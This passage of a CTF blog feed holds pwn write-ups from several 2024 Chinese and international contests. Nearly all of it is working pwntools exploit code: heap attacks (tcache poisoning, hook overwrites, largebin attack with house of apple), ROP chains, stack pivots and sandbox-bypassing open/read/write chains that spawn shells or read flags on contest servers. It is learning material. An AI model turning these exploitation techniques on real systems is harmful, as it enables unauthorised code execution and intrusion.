    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Size ')
    io.sendline(str(size).encode())


def delete(idx):
    cmd(4)
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())


def show(idx):
    cmd(3)
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())


def edit(idx,content=b'deafbeef'):
    cmd(2)
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Content: ')
    io.sendline(content)

add(0,0xf8)#0
add(1,0xf8)#1
add(2,0xf8)#2
add(3,0xf8)#3
for i in range(20,27):
    add(i,0xf8)
for i in range(20,27):
    delete(i)
pay = b'a'*0xf0 + p64(0x200)
delete(0)
edit(1,pay)
delete(2)
for i in range(20,27):
    add(i,0xf8)
add(31,0xf8)
show(31)
io.recvuntil(b'Content: ')
libc_base = u64(io.recv(6).ljust(8,b'\x00')) - 4112272
print(&quot;libc_base = &quot;,hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook'] 
one = [0x4f29e,0x4f2a5,0x4f302,0x10a2fc]

add(30,0xf8)
delete(3)
delete(30)
edit(1,p64(free_hook))
add(11,0xf8)
add(12,0xf8)
edit(12,p64(libc_base + one[2]))
# gdb.attach(io)
delete(11)

io.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[litctf（国外）]]></title>
        <id>https://l1u66.github.io/post/litctfguo-wai/</id>
        <link href="https://l1u66.github.io/post/litctfguo-wai/">
        </link>
        <updated>2024-09-15T06:14:36.000Z</updated>
        <content type="html"><![CDATA[<p>补个wp<br>
主要是一道没有任何输出的read的开了沙盒的栈溢出，利用原理：先在bss段读取需要执行的rop链，然后将read的got表改一个字节成syscall，程序正常退出会有一个eax置零然后leave out的操作，详细看exp</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux', log_level='debug')


# p = process('./main')
p = remote(&quot;litctf.org&quot;,31771)
elf = ELF('./main')
libc = elf.libc

bss = 0x000000000404000 + 0x700
pop_rdi = 0x00000000004013d3
pop_rsi_r15 = 0x00000000004013d1
read_got = 0x000000000404030
read_plt = 0x0000000004010A0
rax_0_leave_ret = 0x0000000000401364
payload = b'a'*32 + p64(bss) + p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(read_plt)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0) + p64(read_plt)
payload += p64(pop_rdi) + p64(1) + p64(read_plt)
payload += p64(rax_0_leave_ret) 
p.send(payload)

# gdb.attach(p)

pause()
pay = p64(bss + 0x100) + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(0x404718) + p64(0) + p64(read_plt)
p.send(pay)

pause()
pay = p8(0xf0)
p.send(pay)
libc_base = u64(p.recv(6).ljust(8,b'\x00')) - 0x00000000010E1F0
print(&quot;libc_base = &quot;,hex(libc_base))

pop_rax = 0x0000000000036174 + libc_base
pop_rdx_r12 = 0x0000000000119431 + libc_base
#close
rop = b&quot;./flag.txt&quot;
rop = rop.ljust(0x10,b'\x00')
rop+=p64(pop_rdi)
rop+=p64(0)
rop+=p64(pop_rax)
rop+=p64(3)
rop+=p64(read_plt)

#open
rop+=p64(pop_rdi)
rop+=p64(0x404718)# 'flag' address
rop+=p64(pop_rsi_r15)
rop+=p64(0)
rop+=p64(0)
rop+=p64(pop_rax)
rop+=p64(2)
rop+=p64(read_plt)

#read
rop+=p64(pop_rdi)
rop+=p64(0)
rop+=p64(pop_rsi_r15)
rop+=p64(bss - 0x400)# flag store address
rop+=p64(0)
rop+=p64(pop_rax)
rop+=p64(0)
rop+=p64(read_plt)

#write
rop+=p64(pop_rdi)
rop+=p64(1)
rop+=p64(pop_rsi_r15)
rop+=p64(bss - 0x400)# flag store address
rop+=p64(0)
rop+=p64(pop_rax)
rop+=p64(1)
rop+=p64(read_plt)
pause()
p.send(rop)

p.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[第四届“长城杯”网络安全大赛 暨京津冀网络安全技能竞赛（初赛）]]></title>
        <id>https://l1u66.github.io/post/di-si-jie-chang-cheng-bei-wang-luo-an-quan-da-sai-ji-jing-jin-ji-wang-luo-an-quan-ji-neng-jing-sai-chu-sai/</id>
        <link href="https://l1u66.github.io/post/di-si-jie-chang-cheng-bei-wang-luo-an-quan-da-sai-ji-jing-jin-ji-wang-luo-an-quan-ji-neng-jing-sai-chu-sai/">
        </link>
        <updated>2024-09-11T08:24:07.000Z</updated>
        <content type="html"><![CDATA[<p>就差一名进决赛，Kylin_Heap签到堆题本地通了，远端偏移有点问题没整出来，刚出以为是前面那道内核题演化出来的内核堆就没看，后面没时间了，诶，这道出来必进决赛啊，我是队伍罪人😭😭😭</p>
<h1 id="flowershop">FlowerShop</h1>
<p>有个栈溢出检测可以直接绕过，然后修改钱数买magic提供/bin/sh字符串，shop函数中有个check函数，如果买了两个a，一个b还有一个栈溢出，题目给了system函数，可以直接拿到shell</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = remote(&quot;8.147.131.74&quot;,27260)
# p = process(&quot;./pwn1&quot;)
rdi = 0x0000000000400f13
ret = 0x00000000004006f6

pay = b'a'*52 + b'pwn' + b'\x00' + p64(0x1234)
p.sendlineafter(&quot;请输入你的姓名:\n&quot;,pay)
p.sendlineafter(&quot;请输入你的选项:\n&quot;,b'a')
p.sendlineafter(&quot;请输入购买的商品序号:\n&quot;,b'a')
p.sendlineafter(&quot;你想要继续买花吗? 1/0\n&quot;,b'1')
p.sendlineafter(&quot;请输入购买的商品序号:\n&quot;,b'a')
p.sendlineafter(&quot;你想要继续买花吗? 1/0\n&quot;,b'1')
p.sendlineafter(&quot;请输入购买的商品序号:\n&quot;,b'b')
p.sendlineafter(&quot;你想要继续买花吗? 1/0\n&quot;,b'1')
# gdb.attach(p)
p.sendlineafter(&quot;请输入购买的商品序号:\n&quot;,b'c')
payload = b'0'*24 + p64(rdi) + p64(0x000000000601840) + p64(ret) + p64(0x000000000400730)
p.sendlineafter(&quot;你想要继续买花吗? 1/0\n&quot;,payload)

p.interactive()
</code></pre>
<h1 id="kylin_heap">Kylin_Heap</h1>
<p>2.31的修改后的libc，libc偏移有些不同，存在edit after free，uaf漏洞，add无限制大小，泄露出libc之后直接修改tcache bin的next指针劫持hook</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux', log_level='debug')
r = process('./pwn')
#r = remote(&quot;8.147.134.241&quot;,45324)
e = ELF('./pwn')
libc = ELF('./libc-2.31-0kylin9.2k0.2.so')  # ubuntu22打本地
#one = [0xe6c7e, 0xe6c81, 0xe6c84]
one = [0xe3afe, 0xe3b01, 0xe3b04]


def dbg():
    gdb.attach(r)


def cmd(choice):
    r.recvuntil(b'What will you do, adventurer? ')
    r.sendline(str(choice).encode())


def add(size, content=b'a'): #从0开始 最多20个堆
    cmd(1)
    r.recvuntil(b'Enter the size of the block you wish to summon (1 to 1280 bytes): ')
    r.sendline(str(size).encode())
    r.recvuntil(b'bytes):\n')
    r.send(content)


def free(idx):
    cmd(2)
    r.recvuntil(b'Which block will you let go? Enter the index (0-19): ')
    r.sendline(str(idx).encode())


def show(idx):
    cmd(4)
    r.recvuntil(b&quot;Which block's secrets would you like to uncover? Enter the index (0-19): &quot;)
    r.sendline(str(idx).encode())


def edit(idx, content=b'deafbeef'):
    cmd(3)
    r.recvuntil(b'Which block would you like to rewrite? Enter the index (0-19): ')
    r.sendline(str(idx).encode())
    r.recvuntil(b'bytes):\n')
    r.send(content)


def exit():
    cmd(5)

add(0x20,b'a')#0
add(0x20,b'a')#1
add(0x418,b'a')#2
add(0x418,b'a')#3
add(0x418,b'a')#4
add(0x418,b'a')#5
free(2)
show(2)
r.recvuntil(&quot;Revealing the contents of block [2]:\n&quot;)
libcbase = u64(r.recv(6).ljust(8,b'\x00')) - 2018272
print(&quot;libc = &quot;,hex(libcbase))
free(0)
free(1)
show(1)
r.recvuntil(&quot;Revealing the contents of block [1]:\n&quot;)
heap_base = u64(r.recv(6).ljust(8,b'\x00')) - 0x6c0 + 1056
print(&quot;heap_base = &quot;,hex(heap_base))

hook = libcbase + libc.sym[&quot;__malloc_hook&quot;]
edit(1,p64(hook))
add(0x20,b'a')#6
add(0x20,p64(libcbase + one[1]))#7
cmd(1)
print(&quot;hook = &quot;,hex(hook))
# dbg()
r.recvuntil(b'Enter the size of the block you wish to summon (1 to 1280 bytes): ')
r.sendline(str(0x30).encode())

r.interactive()
</code></pre>
<h1 id="consumption">consumption</h1>
<p>一道cJSON解析的堆题，拷打gpt后可以整出交互数据结构<img src="https://l1u66.github.io//post-images/1726043609017.png" alt="" loading="lazy">这里的a3是与s偏移0x500的v13变量，sccanf函数可以把a1写入到v13指向的地址中去，程序是32位的，正好以%d的形式可以写入一个地址，攻击思路是在heap_list中写入printf的got表，从而泄露出libc，通过edit将free_got修改成system，free一个带/bin/sh的堆块即可得到shell</p>
<pre><code>from pwn import *
context(arch='i386', os='linux', log_level='debug')
r = process('./pwn')
elf = ELF('./pwn')
libc=ELF(&quot;./libc-2.31.so&quot;)

one = [0xe6aee, 0xe6af1, 0xe6af4]

# {&quot;choice&quot;:&quot;3&quot;,&quot;idx&quot;:0,&quot;size&quot;:&quot;0x60&quot;,&quot;content&quot;:&quot;aaaa&quot;}



def dbg():
    gdb.attach(r)


def add(size, content):   # 不超过0x400  下标从0开始
    r.recvuntil(b'5.exit\t\n')
    r.sendline(b'{&quot;choice&quot;:&quot;1&quot;,&quot;idx&quot;:0,&quot;size&quot;:&quot;' + bytes(str(size),encoding=&quot;utf-8&quot;) + b'&quot;,&quot;content&quot;:&quot;' + content + b'&quot;}')

def delete(idx):
    r.recvuntil(b'5.exit\t\n')
    r.sendline('{&quot;choice&quot;:&quot;2&quot;,&quot;idx&quot;:' + str(idx) + ',&quot;size&quot;:&quot;&quot;,&quot;content&quot;:&quot;&quot;}')


def show(idx):
    r.recvuntil(b'5.exit\t\n')
    r.sendline('{&quot;choice&quot;:&quot;3&quot;,&quot;idx&quot;:' + str(idx) + ',&quot;size&quot;:&quot;&quot;,&quot;content&quot;:&quot;&quot;}')


def edit(idx, content=b'deafbeef'):
    r.sendlineafter(b&quot;5.exit\t\n&quot;,b'{&quot;choice&quot;:&quot;4&quot;,&quot;idx&quot;:1,&quot;size&quot;:&quot;&quot;,&quot;content&quot;:&quot;' + content + b'&quot;}')


heaplist=0x08051B10
add(8,b&quot;/bin/sh&quot;)
add(elf.got[&quot;printf&quot;], b&quot;A&quot;*0x4cc + p32(heaplist + 4))
show(1)
r.recv(0x8)
libc.address = u32(r.recv(4)) - libc.sym[&quot;printf&quot;]
print(&quot;libc.address = &quot;,hex(libc.address))

system = libc.sym[&quot;system&quot;]

edit(1,b&quot;A&quot; * 4 + p32(system))

delete(0)

r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[2024年京津冀大学生信息安全网络攻防大赛（首届）]]></title>
        <id>https://l1u66.github.io/post/2024-nian-jing-jin-ji-da-xue-sheng-xin-xi-an-quan-wang-luo-gong-fang-da-sai-shou-jie/</id>
        <link href="https://l1u66.github.io/post/2024-nian-jing-jin-ji-da-xue-sheng-xin-xi-an-quan-wang-luo-gong-fang-da-sai-shou-jie/">
        </link>
        <updated>2024-09-07T06:11:11.000Z</updated>
        <content type="html"><![CDATA[<h1 id="leak">leak</h1>
<p>程序把flag文件打开，然后一字节一字节比对，匹配一字节之后才会读下一个，读取的位置和输入的数据挨着，后面可以直接带出来，后面就是一字节一字节得泄露，<s>垃圾环境，整一堆垃圾数据不知道干啥，另一队死活打不出来</s></p>
<pre><code>from pwn import *
context(arch='amd64', os='linux', log_level='debug')

flag = b&quot;flag{&quot;

while(1):
    print(&quot;flag : {}&quot;.format(flag))
    p = remote(&quot;119.23.41.54&quot;,35432)
    # p = process(&quot;./leak&quot;)
    pay = flag.ljust(40,b'c')
    p.sendlineafter(&quot;What's your name?&quot;,pay)
    # gdb.attach(p)
    p.sendlineafter(&quot;Please give me your flag:&quot;,pay)
    p.recvuntil(&quot;Sorry &quot;)
    p.recv(40)
    flag += p.recv(1)
    print(flag)
    # flag += chr(j)
    # print(&quot;flag : &quot;,flag)
    # log.success(&quot;{} pos : {} success&quot;.format(i,chr(j)))
    p.close()
p.interactive()
</code></pre>
<h1 id="likeputs">likeputs</h1>
<p>栈溢出签到题</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = remote(&quot;119.23.41.54&quot;,34005)
system = 0x000000000400540
cmd = 0x000000000400797
rdi = 0x0000000000400753
ret = 0x0000000000400506
p.sendafter(&quot;cat flag\n&quot;,b'a'*32 + p64(0) + p64(rdi) + p64(cmd) + p64(ret) + p64(system))
p.interactive()
</code></pre>
<h1 id="condition">Condition</h1>
<p>条件竞争....free置零操作在sleep后，可以设法构造uaf，本地泄露出来heap基地址了，远端泄露不出来，还不给远端liibc版本，无敌了</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[羊城杯2024]]></title>
        <id>https://l1u66.github.io/post/yang-cheng-bei-2024/</id>
        <link href="https://l1u66.github.io/post/yang-cheng-bei-2024/">
        </link>
        <updated>2024-08-30T14:01:08.000Z</updated>
        <content type="html"><![CDATA[<p>比赛这天杂事有点多，整个下午没打成，只看了两道题，出了一道，另一道本地通了，远端一到最后输入伪造的io时挂掉，猜测是因为输入缓冲区被填满导致提前flush了，下面给出的是赛后改善后的exp，可惜没有环境检验哩(悲</p>
<h1 id="pstack">pstack</h1>
<p>pwn的签到题，溢出16字节的栈迁移</p>
<pre><code>from pwn import *
from LibcSearcher import *
context(os=&quot;linux&quot;, arch=&quot;amd64&quot;)

p = process('./pwn')
#p = remote(&quot;139.155.126.78&quot;,32231)
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

bss = 0x000000000601010 + 0x800
leave_ret = 0x00000000004006da
vuln = 0x0000000004006C4
pop_rdi_ret = 0x0000000000400773
read_got = 0x000000000600FD8
puts_plt = 0x000000000400520
ret = 0x0000000000400506

gdb.attach(p)
payload = b'a' * 48 + p64(bss + 0x30) + p64(vuln)
p.sendafter(&quot;overflow?\n&quot;,payload)


payload = p64(bss - 0x100) + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(vuln) + p64(0) + p64(0x601810) + p64(leave_ret)
p.send(payload)

read_addr = u64(p.recv(6).ljust(8,b'\x00'))
print(hex(read_addr))

libc_base = read_addr - libc.symbols['read']
system_addr = libc_base + libc.symbols['system']
bin_addr = libc_base + next(libc.search(b'/bin/sh'))

print(&quot;base = &quot;,hex(libc_base))
print(&quot;read = &quot;,hex(libc.symbols['read']))
one = [0xebc81, 0xebc85, 0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]

payload = b'a' * 48 + p64(bss - 0x100 + 0x30) + p64(vuln)
p.send(payload)
payload = p64(bss - 0x100) + p64(pop_rdi_ret) + p64(bin_addr) + p64(ret) + p64(system_addr) + p64(vuln) + p64(0) + p64(bss - 0x100) + p64(leave_ret)
p.send(payload)
p.interactive()
</code></pre>
<h1 id="travelgraphorw的house-of-apple">TravelGraph(orw的house of apple)</h1>
<p>漏洞点是uaf，增删改查都有，但是edit只能用一次还得绕过一个检查，正好用来largebin attack<br>
add可以申请0x510,0x520,0x530的堆块，出来的chunk长这样<img src="https://l1u66.github.io//post-images/1725027045497.png" alt="" loading="lazy"><br>
每个功能都是通过起始地和终点的数字来查找的，但是free后此区域会被覆盖，所以我利用uaf的方法是unsortedbin的chunk分割，从而伪造起始地，终点，far和工具，并且注意，edit的长度是根据工具的数字计算的，所以可以通过伪造工具的数字实现一次很大的堆溢出，后面就是largebin attack+house of apple了</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux', log_level='debug')
r = process('./pwn')
#r = remote(&quot;139.155.126.78&quot;,37421)
e = ELF('./pwn')
libc = ELF('./libc.so.6')  # ubuntu22打本地

city = [b&quot;guangzhou&quot;, b&quot;nanning&quot;, b&quot;changsha&quot;, b&quot;nanchang&quot;, b&quot;fuzhou&quot;]


def dbg():
    gdb.attach(r)


def cmd(choice):
    r.recvuntil(b'5. Calculate the distance.\n')
    r.sendline(str(choice).encode())


def add1(start, stop, dis, content):
    cmd(1)
    r.recvuntil(b'car/train/plane?\n')
    r.sendline(b'car')
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[start])
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[stop])
    r.recvuntil(b'How far?\n')
    r.sendline(str(dis).encode())
    r.recvuntil(b'Note:\n')
    r.send(content)

def add2(start, stop, dis, content):
    cmd(1)
    r.recvuntil(b'car/train/plane?\n')
    r.sendline(b'train')
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[start])
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[stop])
    r.recvuntil(b'How far?\n')
    r.sendline(str(dis).encode())
    r.recvuntil(b'Note:\n')
    r.send(content)

def add3(start, stop, dis, content):
    cmd(1)
    r.recvuntil(b'car/train/plane?\n')
    r.sendline(b'plane')
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[start])
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[stop])
    r.recvuntil(b'How far?\n')
    r.sendline(str(dis).encode())
    r.recvuntil(b'Note:\n')
    r.send(content)


def delete(start, stop):
    cmd(2)
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[start])
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[stop])


def show(start, stop):
    cmd(3)
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[start])
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[stop])


def edit(start, stop, dis, content):
    cmd(4)
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[start])
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[stop])
    r.recvuntil(b'Which one do you want to change?\n')
    r.sendline(b'0')
    r.recvuntil(b'How far?\n')
    r.sendline(str(dis).encode())
    r.recvuntil(b'Note:\n')
    r.send(content)


def exit():
    cmd(5)
#   x/20gx  &amp;routes
add1(1,1,1000,b'flag\x00\x00\x00\x00')#1
add3(1,2,1000,b'a')#2
add1(2,2,1000,b'a')#3
delete(1,1)
add2(2,4,1000,b'a')#4
add1(1,1,1000,b'\x70')#5
show(1,1)
r.recvuntil(&quot;Note:&quot;)
heap_base = u64(r.recv(6).ljust(8,b'\x00')) - 0x1470
print(&quot;heap_base = &quot;,hex(heap_base))
delete(1,1)
delete(1,2)
add1(1,3,1000,b'a')#1
delete(1,3)
add3(1,4,1000,b'b'*0x510)#1
show(1,4)
r.recvuntil(&quot;Note:&quot;)
r.recv(0x510)
libc_base = u64(r.recv(6).ljust(8,b'\x00')) - 2206944
print(&quot;libc_base = &quot;,hex(libc_base))

delete(1,4)
add3(2,3,1000,b'a'*0x508 + p64(0x541) + p32(0) + p32(3) + p32(0x800) + p32(1000))#1
cmd(5)
r.recvuntil(b'Please input the city name\n')
r.sendline(b'nanchang')
add1(4,4,1000,b'k')#1
add3(1,1,1000,b'flag\x00\x00\x00\x00')#1

IO_list_all=libc_base+libc.symbols['_IO_list_all']
magic_gadget=libc_base+0x000000000016a06a
&quot;&quot;&quot;
&lt;svcudp_reply+26&gt;:    mov    rbp,QWORD PTR [rdi+0x48]
&lt;svcudp_reply+30&gt;:    mov    rax,QWORD PTR [rbp+0x18]
&lt;svcudp_reply+34&gt;:    lea    r13,[rbp+0x10]
&lt;svcudp_reply+38&gt;:    mov    DWORD PTR [rbp+0x10],0x0
&lt;svcudp_reply+45&gt;:    mov    rdi,r13
&lt;svcudp_reply+48&gt;:    call   QWORD PTR [rax+0x28]
&quot;&quot;&quot;
leave_ret=libc_base+0x000000000004da83
add_rsp_ret = libc_base+0x0000000000125b80
lock=libc_base+0x21ba60
pop_rdi=libc_base+0x000000000002a3e5
pop_rsi=libc_base+0x000000000002be51
pop_rdx_r12=libc_base+0x000000000011f2e7
pop_rax_ret=libc_base+0x0000000000045eb0
ret = libc_base+0x0000000000029139
syscall=libc_base+0x0000000000029db4
read_addr=libc_base+libc.symbols['read']
write_addr=libc_base+libc.symbols['write']
puts_addr=libc_base+libc.symbols['puts']
open_addr=libc_base+libc.symbols['open']

fake_io_file_addr = heap_base + 6576
setcontext = libc_base + libc.sym['setcontext']
system = libc_base + libc.sym['system']
_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
lock = libc_base+0x1ee7d0

orw_addr = fake_io_file_addr + 632
#open orw_addr+16
orw = b'flag\x00\x00\x00\x00'
orw += p64(add_rsp_ret) + p64(add_rsp_ret) + p64(orw_addr-8) + p64(0) + p64(leave_ret) + p64(0)
orw += p64(pop_rdx_r12) + p64(0) + p64(fake_io_file_addr - 0x10)#fake io addr
orw += p64(pop_rdi) + p64(orw_addr+16-24)
orw += p64(pop_rsi) + p64(0)
orw += p64(pop_rax_ret) + p64(2)
orw += p64(open_addr)
#read
orw += p64(pop_rdi) + p64(3)
orw += p64(pop_rsi) + p64(orw_addr + 0x100)
orw += p64(pop_rdx_r12) + p64(0x50) + p64(0)
orw += p64(read_addr)
#puts
orw += p64(pop_rdi) + p64(orw_addr + 0x100)
orw += p64(puts_addr)

fake_io_file = p64(2206944+libc_base)*2 + p64(1) + p64(2) + p64(0)*3 + p64(orw_addr-8)
fake_io_file = fake_io_file.ljust(
    0xa0 - 0x10, b'\0') + p64(fake_io_file_addr + 0x100)  # _wide_data
fake_io_file = fake_io_file.ljust(
    0xc0 - 0x10, b'\0') + p64(0xffffffffffffffff)  # _mode
fake_io_file = fake_io_file.ljust(
    0xd8 - 0x10, b'\0') + p64(_IO_wfile_jumps)  # vtable
fake_io_file = fake_io_file.ljust(
    0x100 - 0x10 + 0xe0, b'\0') + p64(fake_io_file_addr + 0x200)
fake_io_file = fake_io_file.ljust(
    0x200 - 0x10, b'\0') + p64(0)*13 + p64(magic_gadget)
fake_io_file += orw


add1(3,3,1000,b'a')#1
add1(3,4,1000,b'a')#1
delete(2,4)
add3(1,1,1000,b'a')#1
delete(4,4)


cmd(4)
r.recvuntil(b'Please input the city name\n')
r.sendline(city[0])
r.recvuntil(b'Please input the city name\n')
r.sendline(city[3])
r.recvuntil(b'Which one do you want to change?\n')
r.sendline(b'0')
r.recvuntil(b'How far?\n')
r.sendline(b'0')
r.recvuntil(b'Note:\n')
r.send(p64(0) + p64(0x521) + fake_io_file.ljust(0x510,b'\x66') + p64(0x520) + p64(0x520) + b'c'*0x518 + p64(0x531) + p64(2208016 + libc_base)*2 + p64(9200 + heap_base) + p64(IO_list_all - 0x20))#
# r.send(p64(0) + p64(0x521) + b'b'*0x518 + p64(0x521) + b'c'*0x518 + p64(0x531) + p64(0)*3 + p64(IO_list_all - 0x20) + b'c'*0x500 + p64(0x530) + p64(0x540) + b'd'*0x530 + b&quot;  sh;&quot; )
add3(1,1,1000,b'a')#1
print(&quot;IO_list_all = &quot;,hex(IO_list_all))
print(&quot;magic_gadget = &quot;,hex(magic_gadget))
print(&quot;leave_ret = &quot;,hex(leave_ret))

# gdb.attach(r)


r.recvuntil(b'5. Calculate the distance.\n')
r.sendline(str(7).encode())
r.interactive()

# + p64(2208016 + libc_base)*2 + p64(6576 + heap_base) + p64(IO_list_all - 0x20)
</code></pre>
]]></content>
    </entry>
</feed>